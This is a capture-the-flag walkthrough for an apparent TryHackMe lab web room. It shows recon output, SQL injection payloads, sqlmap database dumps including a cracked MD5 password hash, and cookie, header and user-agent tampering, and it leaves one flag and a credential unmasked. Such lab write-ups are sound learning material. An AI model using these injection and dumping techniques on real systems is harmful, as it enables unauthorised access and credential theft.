I first save home page into a folder for image stagenography....

# nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 360 No Scope!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# dirsearch
```
[23:22:14] 200 -   38KB - /button
[23:22:15] 403 -  289B  - /cgi-bin/
[23:22:29] 403 -  285B  - /doc/
[23:22:29] 403 -  300B  - /doc/en/changes.html
[23:22:29] 403 -  299B  - /doc/stable.version
[23:22:44] 200 -   92KB - /index
[23:22:46] 200 -   92KB - /index.php
[23:22:46] 200 -   92KB - /index.php/login/
[23:22:51] 301 -  314B  - /login  ->  http://10.10.161.234/login/
[23:22:52] 200 -  782B  - /login/index
[23:22:52] 200 -  782B  - /login/
[23:23:15] 200 -  430B  - /robots.txt
[23:23:18] 403 -  294B  - /server-status
[23:23:18] 403 -  295B  - /server-status/
[23:23:30] 200 -  248KB - /static

```

# robots.txt
upon visiting i got
```
User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)

Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=


45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
```
first i go with Disallow:
with cyberchef and base64 4 iteration we decrypt it...
[](robots1.png)
```
DesKel_secret_base
```
second hex value...

# easter 1
from finding hex hash in robots.txt upon decrypting...
```
45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
```
by using cyberchef...
[](./easter1.png)

and got easter egg 1
```
Easter 1: THM{--------------}
```

# easter2
When i visit disallow entry DesKel_secret_base
i got 
[](./dis.png)
and when i view it's source...
[](./dis2.png)
and i got easter egg 2
```
Easter 2: THM{----------}
```

# easter 3
When i go to see login page ...
[](./login.png)
it's title is quite interesting..
so i look for source page i got
[](./login2.png)
and got easter egg 3
```
<p hidden>Seriously! You think the php script inside the source code? Pfff.. take this easter 3: THM{-----------}</p> 
```

# easter 4
when i try to login here... with creds from index page..
[](./login1.png)
let's try sql injection here...
and we know username is right only password is problem...
so let's use payloads for all types of sql injection for determine which type will work...
and only one work and give something
```
' or sleep(5)='
```
we got 
```
Skidy still a nice guy!!! Btw, wrong password	
```

but still password is wrong...
let's try sqlmap and see what we gonna get...
```
[02:07:35] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 325 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=DesKel' AND 7770=7770 AND 'RCyk'='RCyk&password=asd&submit=submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=DesKel' AND (SELECT 4294 FROM (SELECT(SLEEP(5)))aNXd) AND 'IOHp'='IOHp&password=asd&submit=submit
---
[02:07:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[02:07:52] [INFO] fetched data logged to text files under '/home/mayomacam/.sqlmap/output/10.10.161.234'

[*] ending @ 02:07:52 /2021-01-08/
```

we got successful sqli...

let's retrive database
```
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

```
Let's dump first THM_f0und_m3...
```
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+
```
have 2 tables let's see first user..
```
Database: THM_f0und_m3
Table: user
[2 entries]
+------------------------------------+----------+
| password                           | username |
+------------------------------------+----------+
| 05f3672ba34409136aa71b8d00070d1b   | DesKel   |
| He is a nice guy, say hello for me | Skidy    |
+------------------------------------+----------+
```
and now table nothing_inside
```
[03:10:07] [INFO] retrieved: THM{---------------}             
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{----------------}   |
+-------------------------+
```
got easter egg 4
```
THM{1nj3c7_l1k3_4_b055}
```

# easter 5
Let's decode DesKel password...
first let's use hash analyzer .
[](./des.png)
it's a md5 hash now let's use md5hashing.net
[](./des2.png)
let's login user creds..
```
username = DesKel
password = *****
```

and creds accpted...
[](./des1.png)
and got easter egg 5
```
Easter 5: THM{-------------------------}
```


# easter 6
i was intercepting all request and reponse in burp and in header i found
[](./easter6.png)

got easter egg 6
```
HTTP/1.1 200 OK
Date: Thu, 07 Jan 2021 18:21:46 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{--------------}
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
Content-Length: 94441
```

# easter 7
I was checking for cookies in website...
and i found there is one 
```
Cookie: Invited=0
```

with this we always get...
[](./main.png)
second image who are you?
but when i update cookie to 1 then...
[](./welcome.png)
got easter egg 7
```
THM{-------------------} 
```

# easter 8
After that there was written something like...
```
Psst....psst.. hey dude.......do you have extra cash

Please buy me one iphone 11....I'm poor, link down below.

You need Safari 13 on iOS 13.1.2 to view this message. If you are rich enough
```
[](./iphone.png)
It's almost like it's saying us too change user agent too safari on ios... so i change my user agent in burp...
```
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
```
and also set invited cookie to 1.. and now always gonna make it set...
[](./iphone2.png)
i got easter egg 8
```
You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8: THM{-----------------------}
```
here it's telling us same to set the cookie to invited.. and user agent also...


# easter 9
In webpage there is a button image for burning world...
[](./burn.png)
when i view source
[](./burn2.png)
that's interesting...
So i click the button...
and i was intercepting request and response with burp ...
[](./ready.png)
and in respone i got
[](./easter9.png)

and got easter egg 9
```
	<!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{---------------} -->
```

# easter 10
There is a voucher for tryhackme as it is saying on webpage...
[](./subs.png)
and upon click and going to the page we got
[](./subs1.png)
this is telling that webpage must be refer from tryhackme to there... so we have to update Referer to tryhackme...
[](./sub3.png)
and got easter egg 10
```
Nah, there are no voucher here, I'm too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{----------}
```

# easter 11
There is menu let's try it again..
[](./eater.png)

when i intercept request and response both with burp. i got
```
salad            : Mmmmmm... what a healthy choice, I prefer an egg
chicken sandwich : Delicious!!!
tyre             : Seriously, tyre?
DesKel           : How dare you!
```

all the option at first didn't make any sense but salad response contain egg which is also food and we have to choose a food..
let's go with that...
[](./eater3.png)
and in response we got
[](./eater4.png)
got easter egg 6
```
You found the secret menu, take the easter 11: THM{----------}
```


# easter 12
It's a ctf so i even check for jquery file....
[](./query.png)
i didn't except to find this....
```sh
function ahem()
 {
	str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
	var hex  = str1.toString();
	var str = '';
	for (var n = 0; n < hex.length; n += 2) {
		str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
	}
	return str;
 }
```
Only one function even rewrite jquery file...
str1 is hex value of something...
[](./easter12.png)
got easter egg 12
```
Easter 12 is THM{------------}
```

# easter 13
After easter egg 9 
[](./ready.png)
i got then on next redirection we got 
i was intercepting response ....
[](./easter13.png)
and final webpage
[](./easter13.1.png)

i got easter egg 13
```
Happy? Take the egg now. Easter 13: THM{--------------}
```

# easter 14
[](./website.png)
let's view source of oage...
[](./easter14.png)

after saving img tag and data ...
[](./easter14.1.png)
got easter egg 14
```
THM{-------------}
```

# easter 15
[](./game.png)
In game1 ....
[](./game0.png)
let's try some keyowrd...
[](./game1.2.png)
here we can see that it's send a corrosponding value for given value...
we can make burp to put a-z , A-Z and 0-9 for all chars value...
for compare here...
but 
[](./game1.4.png)
we have to make run samething one more time to get exact value...
and we got after 
[](./game1.1.png)
and got easter egg 15
```
Good job on completing the puzzle, Easter 15: THM{----------------}
```


# easter 16
in game2 ....
[](./game2.png)
when i click on button1 and intercept request in burp...
[](./game2.1.png)
when request complete...
[](./game2.1.1.png)
It's means we have to update query to make it like...
[](./game2.2.png)
and in response we got...
[](./response2.3.png)
and got easter egg 16
```
Just temper the code and you are good to go. Easter 16: THM{---------------------}
```

# easter 17
[](./rainbow.png)
upon viewing source code we got
[](./catz.png)

and there is this function
```
<script>
	function catz(){
        	document.getElementById("nyan").innerHTML = "100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101"
	}
	</script>
```
upon click on catz function which must be instead of nyan function we should get this on next line...
this is raw binary data...
so i am using [rapidtables](https://www.rapidtables.com/convert/number/binary-to-decimal.html) ...
we got 
[](./hex.png)
and using hex value with cyberchef...
[](./easter17.png)
and got easter egg 17
```
Easter 17: THM{---------------}
```

# easter 18
this is line is saying something normally it's meaning less but it's a ctf...
[](./easter18.png)
so i capture repuest using burp and add a header Egg with value of Yes.
[](./easter18.2.png)

and we got
[](./easter18.1.png)

got easter egg 18..
```
That's it, you just need to say YESSSSSSSSSS. Easter 18: THM{------------------}
```

# easter 19
in one of image of all downloading inage...
```
<img height="2" width="2000" src="small.png"/>
```
[](./small2.png)

after download we can see
[](./small.png)

got easter egg 19..
```
THM{--------------}
```

# easter 20
In last on webpage...
[](./easter20.1.png)
we got creds
```
username:DesKel, password:heIsDumb
```
we have to send this data on same page...
normally content type of text data is `application/x-www-form-urlencoded`
so we need to modified the get request into post request...
so we add 3 line and delete connection header line...
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=DesKel&password=heIsDumb
```
and send request using burp..
[](easter20.png)

got easter egg 20...
```
Okay, you pass, Easter 20: THM{--------------------}
```

